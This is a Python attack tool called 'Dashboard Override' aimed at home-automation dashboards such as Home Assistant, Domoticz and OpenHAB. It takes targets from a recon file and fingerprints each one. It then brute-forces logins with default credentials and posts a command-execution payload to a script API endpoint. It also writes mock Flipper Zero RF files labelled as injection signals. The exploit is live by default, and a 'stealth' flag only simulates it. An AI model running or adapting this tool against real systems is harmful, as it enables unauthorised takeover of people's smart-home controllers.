#!/usr/bin/env python3
import requests
import time
import argparse
import os
from datetime import datetime

# Recon file and RF export path
RECON_FILE = "recon/dashboard_targets.txt"
RF_EXPORT_DIR = "exports_rf"
COMMON_CREDS = [('admin', 'admin'), ('admin', 'password'), ('root', 'toor')]
CVE_PAYLOAD = {"script": "os.system('touch /tmp/pwned')"}

# Simulated RF .sub content
RF_SUB_MOCK = """
Filetype: Flipper SubGhz RAW File
Version: 1
Frequency: 433920000
Protocol: RAW
RAW_Data: 310,320,-305,315,...
"""

# Known dashboard fingerprints
def fingerprint_dashboard(ip):
    try:
        r = requests.get(f"http://{ip}", timeout=4)
        banner = r.text.lower()
        if "home assistant" in banner:
            return "Home Assistant"
        elif "domoticz" in banner:
            return "Domoticz"
        elif "openhab" in banner:
            return "OpenHAB"
        return "Unknown"
    except:
        return "Unreachable"

# Brute-force login simulation
def attempt_login(ip):
    for user, pwd in COMMON_CREDS:
        try:
            r = requests.post(f"http://{ip}/login", data={'username': user, 'password': pwd}, timeout=3)
            if "dashboard" in r.text.lower() or r.status_code == 200:
                return (user, pwd)
        except:
            continue
    return None

# CVE Payload injector
def exploit_dashboard(ip, stealth):
    if stealth:
        print(f"[*] [SIM] Would send CVE payload to {ip}")
        return True
    try:
        r = requests.post(f"http://{ip}/api/config/script", json=CVE_PAYLOAD, timeout=3)
        return r.status_code == 200
    except:
        return False

# Flipper .sub file writer
def export_rf_signal(ip):
    os.makedirs(RF_EXPORT_DIR, exist_ok=True)
    fname = f"{RF_EXPORT_DIR}/inject_{ip.replace('.', '_')}.sub"
    with open(fname, 'w') as f:
        f.write(RF_SUB_MOCK)
    return fname

# Target selection
def get_targets(manual=False):
    if manual or not os.path.exists(RECON_FILE):
        ip = input("Enter dashboard IP or URL manually: ").strip()
        return [ip]
    else:
        print("[*] Found recon results:")
        with open(RECON_FILE) as f:
            targets = [line.strip() for line in f if line.strip()]
        for i, t in enumerate(targets):
            print(f"  [{i+1}] {t}")
        choice = input("Select number or press Enter for all: ")
        if choice.isdigit():
            return [targets[int(choice)-1]]
        return targets

def main():
    parser = argparse.ArgumentParser(description="Dashboard Override - Real or Stealth mode")
    parser.add_argument('--stealth', action='store_true', help="Enable stealth simulation mode")
    parser.add_argument('--manual', action='store_true', help="Manually input target(s)")
    args = parser.parse_args()

    targets = get_targets(args.manual)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    log_file = f"results/dashboard_override_{timestamp}.log"
    os.makedirs("results", exist_ok=True)

    with open(log_file, 'w') as log:
        for ip in targets:
            print(f"\n[+] Target: {ip}")
            log.write(f"\n[+] Target: {ip}\n")

            dashboard_type = fingerprint_dashboard(ip)
            print(f"    -> Fingerprint: {dashboard_type}")
            log.write(f"    -> Fingerprint: {dashboard_type}\n")

            creds = attempt_login(ip)
            if creds:
                print(f"    -> Login success with {creds[0]}:{creds[1]}")
                log.write(f"    -> Login: {creds[0]}:{creds[1]}\n")
            else:
                print("    -> Login failed with common credentials")
                log.write("    -> Login failed\n")

            if exploit_dashboard(ip, args.stealth):
                print("    -> Exploit success (payload delivered)")
                log.write("    -> Exploit success\n")
            else:
                print("    -> Exploit failed")
                log.write("    -> Exploit failed\n")

            rf_path = export_rf_signal(ip)
            print(f"    -> RF signal exported to {rf_path}")
            log.write(f"    -> RF signal: {rf_path}\n")

    print(f"\n[+] Dashboard override process complete. Log saved to {log_file}")

if __name__ == "__main__":
    main()
